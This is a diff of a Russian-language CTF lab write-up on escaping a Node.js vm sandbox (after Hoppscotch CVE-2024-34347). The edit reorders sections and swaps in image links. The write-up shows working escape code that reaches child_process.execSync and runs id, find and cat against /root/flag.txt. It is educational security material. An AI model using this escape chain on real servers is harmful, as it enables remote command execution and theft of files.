@@ -36,15 +36,8 @@
 
 ---
 
-## 3. Перехват и первичный тест
 
-Для проверки гипотезы в **Pre-request Script** был отправлен запрос, пытающийся получить доступ к глобальному объекту `process` через свойства внедренных объектов.
-
-### Возникает догадка о векторе атаки.
-
----
-
-## 4. Теория уязвимости (Node.js vm Sandbox Escape)
+## 3. Теория уязвимости (Node.js vm Sandbox Escape)
 
 Название лаборатории напрямую описывает суть атаки. В оригинальной уязвимости Hoppscotch (CVE-2024-34347) песочница была реализована через стандартный модуль Node.js `vm`.
 
@@ -70,10 +63,10 @@
 outside = helpers.constructor.constructor('return this')()
 ```
 
-## 3. Перехват и первичный тест
+## 4. Перехват и первичный тест
 
 Для проверки гипотезы в **Pre-request Script** был отправлен запрос. Скрипт пытается выбраться из песочницы через объект `helpers`, получить доступ к глобальному объекту `process` и выполнить системную команду `id`.
-
+![первичный тест](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_5.JPG)
 **Разбор скрипта по частям:**
 
 1. `helpers` — это объект, который был передан в песочницу извне (из основного процесса Node.js). Именно из-за того, что он создан *снаружи*, у него сохраняется ссылка на внешнюю цепочку прототипов.
@@ -86,41 +79,13 @@ outside = helpers.constructor.constructor('return this')()
 8. `.execSync('id')` — синхронно выполняет системную команду `id`.
 9. `.toString()` и `console.log(...)` — преобразуют вывод команды в строку и выводят её в лог (Script Output).
 
+Ответ сервера
+
+![ответ](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_6.JPG)
 ### Догадка о векторе атаки подтверждена: песочница пробита.
 
 ---
 
-## 4. Теория уязвимости (Node.js vm Sandbox Escape)
-
-Название лаборатории напрямую описывает суть атаки. В оригинальной уязвимости Hoppscotch (CVE-2024-34347) песочница была реализована через стандартный модуль Node.js `vm`.
-
-В нашем случае:
-
-- **Песочница (Sandbox)** ожидает выполнения локального кода и не подозревает подвоха.
-- **Злоумышленник** использует цепочку прототипов внедренного объекта для доступа к конструктору `Function`.
-
-### Почему это работает?
-
-Модуль `vm` официально признан небезопасным для запуска недоверенного кода из-за нескольких особенностей:
-
-#### 1. Доступ к внешнему конструктору
-
-Любой объект в JavaScript имеет свойство `constructor`, которое указывает на функцию, создавшую объект. Свойство `constructor` самой функции — это глобальный конструктор `Function`.
-
-#### 2. Создание функции из строки
-
-Конструктор `Function` позволяет создавать новые функции из строк. Код, переданный в `Function('...')`, выполняется в глобальном контексте.
-
-```javascript
-// Получение внешнего глобального объекта через конструктор
-outside = helpers.constructor.constructor('return this')()
-```
-
-#### 3. Выход в реальный мир
-
-Получив доступ к внешнему объекту `global` (который в Node.js содержит объект `process`), мы можем подключить встроенный модуль `child_process` и выполнить любые команды от имени сервера.
-
----
 
 ## 5. Эксплуатация и получение флага
 
@@ -128,6 +93,7 @@ outside = helpers.constructor.constructor('return this')()
 
 Так как точный путь к флагу заранее неизвестен, первым делом выполним команду `find`, чтобы найти файлы, в названии которых есть слово `flag`. Для этого снова используем уже известный вектор побега и передаем в `execSync` команду поиска:
 
+![путь до флага](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_7.JPG)
 ```javascript
 outside = helpers.constructor.constructor('return this')()
 const findResult = outside.process.mainModule.require('child_process')
@@ -144,11 +110,13 @@ console.log(findResult)
 В логах среди системных файлов мы видим искомый файл:
 `/root/flag.txt`
 
-![Поиск флага](https://images/reqforge_find.png)
+![Поиск флага](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_8.JPG)
 
 ### Шаг 2. Чтение флага
 
 Теперь, зная точный путь, меняем команду в `execSync` на `cat`, чтобы прочитать содержимое:
+
+![флаг](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_9.JPG)
 
 ```javascript
 outside = helpers.constructor.constructor('return this')()
@@ -163,7 +131,7 @@ console.log(flag)
 - `.toString()` — возвращает содержимое файла в виде строки.
 - `console.log(flag)` — выводит флаг в панель Script Output.
 
-![Получение флага](https://images/reqforge_flag.png)
+![Получение флага](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_10.JPG)
 
 После отправки запроса в логах отобразился секретный флаг. Задача решена.
 
